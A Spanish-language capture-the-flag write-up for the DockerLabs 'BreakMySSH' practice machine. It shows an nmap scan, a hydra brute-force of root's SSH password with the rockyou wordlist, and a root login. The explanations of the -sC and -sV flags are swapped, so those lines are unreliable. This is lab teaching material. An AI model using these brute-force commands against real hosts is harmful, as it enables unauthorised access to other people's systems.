## WRITEUP DE LA MAQUINA BREACKMYSSH DE DOCKERLABS EN ESPAÑOL

Hacemos un escaneo de puertos con la herramienta Nmap para ver cuales estan abiertos y que servicios y caraterisiticas muestran.

```
└─$ nmap -sC -sV -p- -n --min-rate 5000 172.17.0.2 -oN outputsacn.txt
```
"-sC" Muestra la version del servicio del pureto abierto.
<br>
"-sV" Ejecuta scripts propios de nmap que entre otras cosas descubren información detallada sobre los servicios.
<br>
"-p-" Escanea todos los 65535 puertos TCP.
<br>
"-n" Desactiva la resolución de nombres DNS.
<br>
"--min-rate 5000" Ajusta la tasa mínima de envío de paquetes a 5000 paquetes por segundo, acelerando el escaneo.
<br>
"172.17.0.2" Es la dirección ip de la máquina víctima
<br>
"-oN" Sirve para que te copie el rsultado del escaneo en el fichero que tu le indiques (no hay que crearlo antes, lo crea solo).

```                  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-14 11:09 EDT
Nmap scan report for 172.17.0.2
Host is up (0.000082s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 1a:cb:5e:a3:3d:d1:da:c0:ed:2a:61:7f:73:79:46:ce (RSA)
|   256 54:9e:53:23:57:fc:60:1e:c0:41:cb:f3:85:32:01:fc (ECDSA)
|_  256 4b:15:7e:7b:b3:07:54:3d:74:ad:e0:94:78:0c:94:93 (ED25519)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.60 seconds

```
Observamos el puerto 22, que es del servicio ssh, abierto. Al ser esta una maquina victima muy sencilla, en el siguiente paso podemos permitirnos ya intentar ser "root", lo haremos de la siguiente forma.
<br><br><br>
Hacemos un ataque de fuerza bruta al servicio ssh con la herramienta hydra, donde pondremos la wordlist "rockyou.txt" que incluye aproximadamente un millon de contraseñas comunes.
```sh
└─$ hydra -l root -P /home/kali/Desktop/rockyou.txt ssh://172.17.0.2/ -t 5
```
"-l root" Indica que nombre de usuario va a usar en el ataque, en este caso buscamos a root.
<br>
"-P /home/kali/Desktop/rockyou.txt" Especifica la wordlist de contraseñas que va a usar para probar el ataque de fuerza bruta, cada uno pone la ruta donde se encuentre su fichero wordlist
<br>
"ssh://172.17.0.2/" Especifica el protocolo y la dirección del objetivo del ataque. En este caso, se está atacando el servicio SSH (Secure Shell) en la dirección IP 172.17.0.2
<br>
"-t 5" Especifica el número de tareas (threads) paralelas que Hydra debe usar durante el ataque. En este caso, -t 5 indica que Hydra debe utilizar 5 hilos de ejecución simultáneos para probar las combinaciones de nombre de usuario y contraseña.
```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-14 11:46:06
[DATA] max 5 tasks per 1 server, overall 5 tasks, 14344399 login tries (l:1/p:14344399), ~2868880 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[STATUS] 55.00 tries/min, 55 tries in 00:01h, 14344344 to do in 4346:47h, 5 active
[22][ssh] host: 172.17.0.2   login: root   password: estrella
```
Vemos que para el usuario "root" ha encontrado la contraseña "estrella", probamos a hacer una conexion con ssh e introducimos la contraseña "estrella"
```
└─$ ssh root@172.17.0.2 
```
```
root@e1c6130e3b9a:~# whoami
root
```
<br>

<div style="text-align: center;">
Somos root, estamos dentro. Gracias.
</div>                                                   